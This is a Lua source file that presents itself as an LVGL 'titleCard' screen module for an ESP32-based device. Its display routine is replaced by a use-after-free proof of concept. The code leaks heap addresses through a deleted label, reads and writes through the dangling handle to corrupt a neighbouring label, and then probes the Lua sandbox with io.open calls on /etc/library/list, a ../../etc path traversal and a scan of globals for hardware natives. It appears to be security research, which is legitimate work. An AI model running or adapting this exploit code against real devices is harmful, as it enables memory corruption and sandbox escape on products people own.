---@class titleCard
local titleCard = {}
titleCard.styles = {}

titleCard.parentContainer = nil
titleCard.subtitleLabel = nil
titleCard.titleLabel = nil
titleCard.image = nil
titleCard.isAudioStarted = false
titleCard.opacityAnim = nil
titleCard.opacityAnimVar = nil
titleCard.translateAnim = nil
titleCard.translateAnimVar = nil
titleCard.closeAnim = nil
titleCard.closeAnimVar = nil
titleCard.callback = nil
titleCard.event_clicked_cb = nil
titleCard.img = nil

-- Donnees d'audit partagees entre les pages
titleCard._audit = {}

function titleCard.initSyles()
    titleCard.styles.parentContainer = lv.style.new()
    lv.style.set_bg_color(titleCard.styles.parentContainer, lv.color.hex(0x000000))
    lv.style.set_bg_opa(titleCard.styles.parentContainer, lv.OPA_COVER)
    lv.style.set_pad_top(titleCard.styles.parentContainer, 31)
    lv.style.set_pad_right(titleCard.styles.parentContainer, 0)
    lv.style.set_pad_bottom(titleCard.styles.parentContainer, 0)
    lv.style.set_pad_left(titleCard.styles.parentContainer, 16)

    titleCard.styles.subtitle = lv.style.new()
    lv.style.set_text_color(titleCard.styles.subtitle, lv.color.hex(0xffffff))
    lv.style.set_text_font(titleCard.styles.subtitle, lv.font.nunito_bold_12)
    lv.style.set_text_opa(titleCard.styles.subtitle, 0)

    titleCard.styles.title = lv.style.new()
    lv.style.set_text_color(titleCard.styles.title, lv.color.hex(0xffffff))
    lv.style.set_text_font(titleCard.styles.title, lv.font.nunito_extrabold_20)
    lv.style.set_text_line_space(titleCard.styles.title, 4)
    lv.style.set_translate_y(titleCard.styles.title, 7)
    lv.style.set_text_opa(titleCard.styles.title, 0)
end

function titleCard.text_opacity_transition(var, val)
    lv.style.set_text_opa(titleCard.styles.title, val)
    lv.obj.invalidate(titleCard.titleLabel)

    lv.style.set_text_opa(titleCard.styles.subtitle, val)
    lv.obj.invalidate(titleCard.subtitleLabel)
end

function titleCard.clean()
    lv.obj.remove_event_cb(titleCard.parentContainer,titleCard.event_clicked_cb)

    if (titleCard.opacityAnim ~= nil) then
        lv.anim_var.del(titleCard.opacityAnimVar)
        titleCard.opacityAnimVar = nil
        titleCard.opacityAnim = nil
    end

    if (titleCard.translateAnim ~= nil) then
        lv.anim_var.del(titleCard.translateAnimVar)
        titleCard.translateAnimVar = nil
        titleCard.translateAnim = nil
    end
    if (titleCard.closeAnim ~= nil) then
        lv.anim_var.del(titleCard.closeAnimVar)
        titleCard.closeAnimVar = nil
        titleCard.closeAnim = nil
    end

    lv.group.remove_all_objs(document)
    lv.obj.clean(window)

    for i, style in pairs(titleCard.styles) do
        lv.style.reset(style)
    end
    titleCard.img = nil
end

function titleCard.close_transition(_,val)
    if (val == 0) then
        titleCard.callback()
    else
        lv.style.set_text_opa(titleCard.styles.title, val)
        lv.obj.invalidate(titleCard.titleLabel)

        lv.style.set_text_opa(titleCard.styles.subtitle, val)
        lv.obj.invalidate(titleCard.subtitleLabel)

        lv.obj.set_style_img_opa(titleCard.image, val, lv.STATE_DEFAULT)
        lv.obj.invalidate(titleCard.image)
    end
end

function titleCard.translate_img(var, val)
    lv.obj.set_style_translate_x(titleCard.image, val, lv.STATE_DEFAULT)
    lv.obj.invalidate(titleCard.image)
end

function titleCard.audio_feedback(state, second)
    titleCard.isAudioStarted = true
    if (state == "stop") then
        titleCard.callback()
    end
end

function titleCard.on_encoder_clicked()
    if( titleCard.isAudioStarted) then
        Global.requestAudioStop(true)
    end
end

-- ============================================================================
--  Couleurs partagees
-- ============================================================================
local C_RED   = lv.color.hex(0xFF0000)
local C_GREEN = lv.color.hex(0x00FF41)
local C_AMBER = lv.color.hex(0xFFBF00)
local C_GREY  = lv.color.hex(0x888888)
local C_WHITE = lv.color.hex(0xCCCCCC)
local C_CYAN  = lv.color.hex(0x00FFFF)
local C_BG    = lv.color.hex(0x0a0a0a)

-- ============================================================================
--  Helper : bouton invisible plein ecran + navigation
-- ============================================================================
local function _add_nav_button(parent, next_page_fn, page_label)
    local _nav_hint = lv.label.new(parent)
    lv.label.set_text(_nav_hint, "[Entree >> " .. page_label .. "]")
    lv.obj.set_style_text_color(_nav_hint, C_GREY, 0)
    lv.obj.align(_nav_hint, lv.ALIGN_BOTTOM_RIGHT, -4, -4)

    -- Utiliser le parentContainer (btn) comme cible du click
    -- Le parentContainer est deja dans le focus group (default group)
    -- Sur le vrai device, c'est le seul objet focusable
    local _nav_btn = lv.btn.new(parent)
    lv.obj.remove_style_all(_nav_btn)
    lv.obj.set_size(_nav_btn, 320, 212)
    lv.obj.set_pos(_nav_btn, 0, 0)
    lv.obj.set_style_bg_opa(_nav_btn, 0, 0)
    -- Forcer l'ajout au focus group
    lv.group.add_obj(document, _nav_btn)
    lv.group.focus_obj(_nav_btn)

    lv.obj.add_event_cb(_nav_btn, function()
        lv.group.remove_all_objs(document)
        next_page_fn()
    end, lv.EVENT_CLICKED)
end

-- Helper : fond noir
local function _setup_bg()
    lv.group.remove_all_objs(document)
    lv.obj.clean(window)
    local _bg = lv.style.new()
    lv.style.set_bg_color(_bg, C_BG)
    lv.style.set_bg_opa(_bg, lv.OPA_COVER)
    lv.obj.add_style(window, _bg, 0)
end

-- ============================================================================
--  PAGE 1 : UAF DIAGNOSTIC
-- ============================================================================
function titleCard.display(args)

    titleCard.callback = args.cb

    lv.obj.clean(window)

    lv.group.set_editing(document, false)
    lv.group.set_wrap(document, false)
    titleCard.initSyles()

    local TAILLE_TEST = 16

    -- PHASE 0 : Setup
    titleCard.parentContainer = require("v-container").create(window, 8, true)
    lv.obj.remove_style_all(titleCard.parentContainer)
    lv.obj.set_size(titleCard.parentContainer, lv.obj.get_width(window), lv.obj.get_height(window))
    lv.obj.set_flex_flow(titleCard.parentContainer, lv.FLEX_FLOW_COLUMN)
    lv.obj.add_style(titleCard.parentContainer, titleCard.styles.parentContainer, lv.STATE_DEFAULT)

    titleCard.event_clicked_cb = lv.obj.add_event_cb(
        titleCard.parentContainer, titleCard.on_encoder_clicked, lv.EVENT_CLICKED)

    local _spy = lv.label.new(titleCard.parentContainer)
    lv.label.set_text(_spy, ".")
    lv.obj.add_flag(_spy, lv.OBJ_FLAG_HIDDEN)
    lv.obj.del(_spy)

    titleCard.subtitleLabel = lv.label.new(titleCard.parentContainer)
    lv.label.set_text(titleCard.subtitleLabel, args.subtitle)
    lv.obj.remove_style_all(titleCard.subtitleLabel)
    lv.obj.set_width(titleCard.subtitleLabel, 214)
    lv.obj.add_style(titleCard.subtitleLabel, titleCard.styles.subtitle, lv.STATE_DEFAULT)

    -- PHASE 1 : Pointer Leak
    local _spy_str = tostring(_spy)
    local _vic_str = tostring(titleCard.subtitleLabel)

    local function _extract_addr(s)
        local addr = string.match(s, "0[xX](%x+)")
        if addr then return "0x" .. string.upper(addr) end
        addr = string.match(s, ":%s*(%x%x%x%x%x+)")
        if addr then return "0x" .. string.upper(addr) end
        addr = string.match(s, "(%x%x%x%x%x%x%x%x+)")
        if addr then return "0x" .. string.upper(addr) end
        return s
    end

    local _spy_addr = _extract_addr(_spy_str)
    local _vic_addr = _extract_addr(_vic_str)

    local function _check_dram(addr_str)
        if string.sub(addr_str, 1, 4) == "0x3F" then return "DRAM ESP32"
        elseif string.sub(addr_str, 1, 4) == "0x3D" then return "PSRAM ESP32"
        else return "Emulateur/autre" end
    end

    local _spy_region = _check_dram(_spy_addr)
    local _vic_region = _check_dram(_vic_addr)
    local _addrs_match = (_spy_addr == _vic_addr)

    print("[AUDIT] ==========================================")
    print("[AUDIT]  PHASE 1 : POINTER LEAK")
    print(string.format("[AUDIT]  Spy    : %s (%s)", _spy_addr, _spy_region))
    print(string.format("[AUDIT]  Victim : %s (%s)", _vic_addr, _vic_region))
    print(string.format("[AUDIT]  Match  : %s", tostring(_addrs_match)))
    print("[AUDIT] ==========================================")

    -- PHASE 2 : UAF Read
    local _read_ok = false
    local _read_val = nil
    local _rok, _rtxt = pcall(lv.label.get_text, _spy)
    if _rok and _rtxt then
        _read_val = _rtxt
        _read_ok = (_rtxt ~= ".")
    end

    print("[AUDIT]  PHASE 2 : UAF READ")
    print(string.format("[AUDIT]  spy lit : \"%s\"", tostring(_read_val)))
    print(string.format("[AUDIT]  Leak   : %s", tostring(_read_ok)))
    print("[AUDIT] ==========================================")

    -- PHASE 3 : Heap Boundary Profiling
    local _payload = string.rep("A", TAILLE_TEST)
    local _write_ok = false
    local _victim_before = args.subtitle
    local _victim_after = nil
    local _write_status = "ECHEC"

    local _wok = pcall(lv.label.set_text, _spy, _payload)
    if _wok then
        local _vok, _vtxt = pcall(lv.label.get_text, titleCard.subtitleLabel)
        if _vok then
            _victim_after = _vtxt
            if _vtxt == _payload then
                _write_ok = true
                _write_status = "CORRUPTION OK"
            else
                _write_status = "ECRIT MAIS MISMATCH"
            end
        else
            _write_status = "CRASH LECTURE VICTIME"
        end
    else
        _write_status = "CRASH ECRITURE SPY"
    end

    print("[AUDIT]  PHASE 3 : HEAP BOUNDARY PROFILING")
    print(string.format("[AUDIT]  Taille payload : %d octets", TAILLE_TEST))
    print(string.format("[AUDIT]  Payload        : \"%s\"",
        #_payload > 40 and string.sub(_payload, 1, 40) .. "..." or _payload))
    print(string.format("[AUDIT]  Victime avant  : \"%s\"", _victim_before))
    print(string.format("[AUDIT]  Victime apres  : \"%s\"", tostring(_victim_after)))
    print(string.format("[AUDIT]  Status         : %s", _write_status))
    if _write_ok then
        print("[AUDIT]  *** CORRUPTION CONFIRMEE ***")
    end
    print("[AUDIT] ==========================================")

    -- ========================================================================
    --  DASHBOARD PAGE 1
    -- ========================================================================
    _setup_bg()

    local _y = 2

    local _hdr = lv.label.new(window)
    lv.label.set_text(_hdr, "UAF DIAGNOSTIC")
    lv.obj.set_style_text_color(_hdr, C_RED, 0)
    lv.obj.set_style_text_font(_hdr, lv.font.nunito_extrabold_20, 0)
    lv.obj.align(_hdr, lv.ALIGN_TOP_MID, 0, _y)
    _y = _y + 24

    -- Pointer Leak
    local _sep1 = lv.label.new(window)
    lv.label.set_text(_sep1, "--- Pointer Leak ---")
    lv.obj.set_style_text_color(_sep1, C_GREY, 0)
    lv.obj.align(_sep1, lv.ALIGN_TOP_MID, 0, _y)
    _y = _y + 14

    local _l_spy = lv.label.new(window)
    lv.label.set_text(_l_spy, "SPY  : " .. _spy_addr)
    lv.obj.set_style_text_color(_l_spy, C_CYAN, 0)
    lv.obj.align(_l_spy, lv.ALIGN_TOP_LEFT, 6, _y)
    _y = _y + 13

    local _l_spy_r = lv.label.new(window)
    lv.label.set_text(_l_spy_r, "       " .. _spy_region)
    lv.obj.set_style_text_color(_l_spy_r, C_GREY, 0)
    lv.obj.align(_l_spy_r, lv.ALIGN_TOP_LEFT, 6, _y)
    _y = _y + 13

    local _l_vic = lv.label.new(window)
    lv.label.set_text(_l_vic, "VICT : " .. _vic_addr)
    lv.obj.set_style_text_color(_l_vic, C_CYAN, 0)
    lv.obj.align(_l_vic, lv.ALIGN_TOP_LEFT, 6, _y)
    _y = _y + 13

    local _l_vic_r = lv.label.new(window)
    lv.label.set_text(_l_vic_r, "       " .. _vic_region)
    lv.obj.set_style_text_color(_l_vic_r, C_GREY, 0)
    lv.obj.align(_l_vic_r, lv.ALIGN_TOP_LEFT, 6, _y)
    _y = _y + 13

    local _l_match = lv.label.new(window)
    if _addrs_match then
        lv.label.set_text(_l_match, "MATCH : OUI (meme bloc)")
        lv.obj.set_style_text_color(_l_match, C_GREEN, 0)
    else
        lv.label.set_text(_l_match, "MATCH : NON (blocs differents)")
        lv.obj.set_style_text_color(_l_match, C_AMBER, 0)
    end
    lv.obj.align(_l_match, lv.ALIGN_TOP_LEFT, 6, _y)
    _y = _y + 16

    -- Heap Profiling
    local _sep2 = lv.label.new(window)
    lv.label.set_text(_sep2, "--- Heap Profiling ---")
    lv.obj.set_style_text_color(_sep2, C_GREY, 0)
    lv.obj.align(_sep2, lv.ALIGN_TOP_MID, 0, _y)
    _y = _y + 14

    local _l_sz = lv.label.new(window)
    lv.label.set_text(_l_sz, string.format("Payload : %d octets (\"A\" x%d)", TAILLE_TEST, TAILLE_TEST))
    lv.obj.set_style_text_color(_l_sz, C_WHITE, 0)
    lv.obj.align(_l_sz, lv.ALIGN_TOP_LEFT, 6, _y)
    _y = _y + 13

    local _l_vb = lv.label.new(window)
    local _vb_disp = _victim_before
    if #_vb_disp > 28 then _vb_disp = string.sub(_vb_disp, 1, 27) .. ".." end
    lv.label.set_text(_l_vb, "Avant : \"" .. _vb_disp .. "\"")
    lv.obj.set_style_text_color(_l_vb, C_WHITE, 0)
    lv.obj.align(_l_vb, lv.ALIGN_TOP_LEFT, 6, _y)
    _y = _y + 13

    local _l_va = lv.label.new(window)
    local _va_disp = tostring(_victim_after)
    if #_va_disp > 28 then _va_disp = string.sub(_va_disp, 1, 27) .. ".." end
    lv.label.set_text(_l_va, "Apres : \"" .. _va_disp .. "\"")
    if _write_ok then
        lv.obj.set_style_text_color(_l_va, C_RED, 0)
    else
        lv.obj.set_style_text_color(_l_va, C_AMBER, 0)
    end
    lv.obj.align(_l_va, lv.ALIGN_TOP_LEFT, 6, _y)
    _y = _y + 16

    local _l_status = lv.label.new(window)
    lv.label.set_text(_l_status, _write_status)
    if _write_ok then
        lv.obj.set_style_text_color(_l_status, C_RED, 0)
    elseif _write_status == "ECHEC" or string.find(_write_status, "CRASH") then
        lv.obj.set_style_text_color(_l_status, C_AMBER, 0)
    else
        lv.obj.set_style_text_color(_l_status, C_WHITE, 0)
    end
    lv.obj.set_style_text_font(_l_status, lv.font.nunito_extrabold_20, 0)
    lv.obj.align(_l_status, lv.ALIGN_BOTTOM_MID, 0, -18)

    -- Navigation >> Page 2
    _add_nav_button(window, titleCard._show_page2, "PAGE 2")

    return  -- Stop : pas d'histoire, pas d'audio
end

-- ============================================================================
--  PAGE 2 : CRASH DIAGNOSTIC — tests sequentiels avec timer
--  Chaque test est execute apres un rendu LVGL pour que l'ecran
--  affiche le nom du test EN COURS. Si le device redemarre,
--  le dernier texte visible = le test qui a crashe.
-- ============================================================================

-- Label de status reutilise entre les steps
titleCard._step_label = nil
titleCard._step_y = 0
titleCard._step_num = 0

-- Affiche "STEP N: desc..." a l'ecran et dans la console
local function _show_step(desc)
    titleCard._step_num = titleCard._step_num + 1
    local txt = string.format("S%02d: %s ...", titleCard._step_num, desc)
    print("[STEP] " .. txt)

    local lbl = lv.label.new(window)
    lv.label.set_text(lbl, txt)
    lv.obj.set_style_text_color(lbl, C_WHITE, 0)
    lv.obj.align(lbl, lv.ALIGN_TOP_LEFT, 4, titleCard._step_y)
    titleCard._step_y = titleCard._step_y + 12
    titleCard._step_label = lbl
    return lbl
end

-- Met a jour le dernier step avec le resultat
local function _step_result(lbl, ok, detail)
    local txt = string.format("S%02d: %s", titleCard._step_num,
        detail or (ok and "OK" or "FAIL"))
    lv.label.set_text(lbl, txt)
    if ok then
        lv.obj.set_style_text_color(lbl, C_GREEN, 0)
    else
        lv.obj.set_style_text_color(lbl, C_AMBER, 0)
    end
    print("[STEP] " .. txt)
end

function titleCard._show_page2()
    -- NE PAS appeler _setup_bg() ni lv.obj.clean(window) ici !
    -- On veut tester si c'est le clean qui crashe le device.
    -- A la place, on cree un overlay opaque par dessus la page 1.

    local _overlay = lv.obj.new(window)
    lv.obj.remove_style_all(_overlay)
    lv.obj.set_size(_overlay, 320, 212)
    lv.obj.set_pos(_overlay, 0, 0)
    lv.obj.set_style_bg_color(_overlay, C_BG, 0)
    lv.obj.set_style_bg_opa(_overlay, lv.OPA_COVER, 0)

    -- Rediriger les labels vers l'overlay au lieu de window
    local _win = _overlay

    titleCard._step_y = 2
    titleCard._step_num = 0

    -- Patcher _show_step et _step_result pour utiliser _overlay
    local _orig_show_step = _show_step

    _show_step = function(desc)
        titleCard._step_num = titleCard._step_num + 1
        local txt = string.format("S%02d: %s ...", titleCard._step_num, desc)
        print("[STEP] " .. txt)
        local lbl = lv.label.new(_win)
        lv.label.set_text(lbl, txt)
        lv.obj.set_style_text_color(lbl, C_WHITE, 0)
        lv.obj.align(lbl, lv.ALIGN_TOP_LEFT, 4, titleCard._step_y)
        titleCard._step_y = titleCard._step_y + 12
        titleCard._step_label = lbl
        return lbl
    end

    local _hdr = lv.label.new(_win)
    lv.label.set_text(_hdr, "CRASH DIAGNOSTIC")
    lv.obj.set_style_text_color(_hdr, C_RED, 0)
    lv.obj.set_style_text_font(_hdr, lv.font.nunito_extrabold_16, 0)
    lv.obj.align(_hdr, lv.ALIGN_TOP_MID, 0, titleCard._step_y)
    titleCard._step_y = titleCard._step_y + 20

    -- File de tests : { description, function() -> ok, detail }
    -- Les premiers tests isolent CE QUI CRASHE lors du changement de page
    local _tests = {
        -- === PHASE A : est-ce que l'overlay lui-meme crashe ? ===
        -- Si on arrive ici, l'overlay est deja cree = OK
        { "overlay cree", function()
            return true, "OK"
        end },

        -- === PHASE B : est-ce que le GC crashe ? ===
        { "collectgarbage", function()
            local kb = math.floor(collectgarbage("count"))
            collectgarbage("collect")
            local kb2 = math.floor(collectgarbage("count"))
            return true, kb .. "K > " .. kb2 .. "K"
        end },

        -- === PHASE C : tester le nettoyage LVGL step by step ===
        { "grp remove_all", function()
            lv.group.remove_all_objs(document)
            return true, "OK"
        end },
        { "child count", function()
            local n = lv.obj.get_child_cnt(window)
            return true, tostring(n) .. " children"
        end },
        -- On ne fait PAS lv.obj.clean(window) car ca detruirait l'overlay !
        -- A la place, on supprime les enfants un par un sauf l'overlay
        { "del child 0", function()
            -- L'overlay est le DERNIER enfant (on l'a cree en dernier)
            -- Les enfants de la page 1 sont avant
            local n = lv.obj.get_child_cnt(window)
            if n > 1 then
                local child = lv.obj.get_child(window, 0)
                lv.obj.del(child)
                return true, "deleted, " .. (n-1) .. " left"
            end
            return true, "only overlay"
        end },
        { "del remaining p1", function()
            -- Supprimer tous les enfants sauf le dernier (overlay)
            local n = lv.obj.get_child_cnt(window)
            local deleted = 0
            while n > 1 do
                local child = lv.obj.get_child(window, 0)
                lv.obj.del(child)
                deleted = deleted + 1
                n = lv.obj.get_child_cnt(window)
            end
            return true, deleted .. " deleted"
        end },

        -- === PHASE D : sandbox tests (ceux-ci ne touchent pas LVGL) ===
        { "type(io)", function()
            return true, "io = " .. type(io)
        end },
        { "type(os)", function()
            return true, "os = " .. type(os)
        end },
        { "type(debug)", function()
            return true, "debug = " .. type(debug)
        end },
        { "type(loadfile)", function()
            return true, "loadfile = " .. type(loadfile)
        end },
        { "io.open /etc/lib", function()
            if type(io) ~= "table" then return true, "no io" end
            local ok, fh = pcall(io.open, "/etc/library/list", "r")
            if ok and fh then
                local rok, data = pcall(fh.read, fh, 16)
                pcall(fh.close, fh)
                return true, rok and "READ OK" or "READ FAIL"
            end
            return true, "no file"
        end },
        { "io.open ../../etc", function()
            if type(io) ~= "table" then return true, "no io" end
            local ok, fh = pcall(io.open, "../../etc/library/list", "r")
            if ok and fh then
                local rok, data = pcall(fh.read, fh, 16)
                pcall(fh.close, fh)
                return true, rok and "READ OK" or "READ FAIL"
            end
            return true, "no file"
        end },
        { "pairs(_G) count", function()
            local n = 0
            for _ in pairs(_G) do n = n + 1 end
            return true, tostring(n) .. " globals"
        end },
        { "_G natives scan", function()
            local kw = {"gpio","audio","power","wifi","spi","i2c","uart","nvs","ota","ffi"}
            local found = {}
            for k, v in pairs(_G) do
                local kl = string.lower(tostring(k))
                local tv = type(v)
                if tv == "function" or tv == "table" or tv == "userdata" then
                    for _, w in ipairs(kw) do
                        if string.find(kl, w, 1, true) then
                            found[#found + 1] = tostring(k)
                            break
                        end
                    end
                end
            end
            return true, #found .. " found"
        end },
    }

    -- Executer les tests avec un timer entre chaque
    -- pour laisser LVGL faire un rendu entre les steps
    local _idx = 0
    local _timer

    local function _run_next()
        -- Mettre a jour le resultat du test precedent
        -- (le step label affichait "..." pendant le rendu)

        _idx = _idx + 1
        if _idx > #_tests then
            -- Tous les tests passes
            lv.timer.del(_timer)
            _timer = nil

            local _done = lv.label.new(window)
            lv.label.set_text(_done, "ALL STEPS OK")
            lv.obj.set_style_text_color(_done, C_GREEN, 0)
            lv.obj.set_style_text_font(_done, lv.font.nunito_extrabold_16, 0)
            lv.obj.align(_done, lv.ALIGN_BOTTOM_MID, 0, -18)
            print("[STEP] ALL STEPS COMPLETED")

            _add_nav_button(_win, function()
                titleCard.display({
                    title = "Use-After-Free PoC",
                    subtitle = "Security Research",
                    cb = function() end
                })
            end, "PAGE 1")
            return
        end

        local test = _tests[_idx]
        local lbl = _show_step(test[1])

        -- Executer le test dans un pcall pour ne pas crasher Lua
        local pok, rok, detail = pcall(test[2])
        if not pok then
            _step_result(lbl, false, test[1] .. " CRASH: " .. tostring(rok))
        else
            _step_result(lbl, rok, test[1] .. " " .. tostring(detail))
        end
    end

    -- Timer : 100ms entre chaque test = temps pour LVGL de rendre
    _timer = lv.timer.new(_run_next, 100, nil)
end

return titleCard
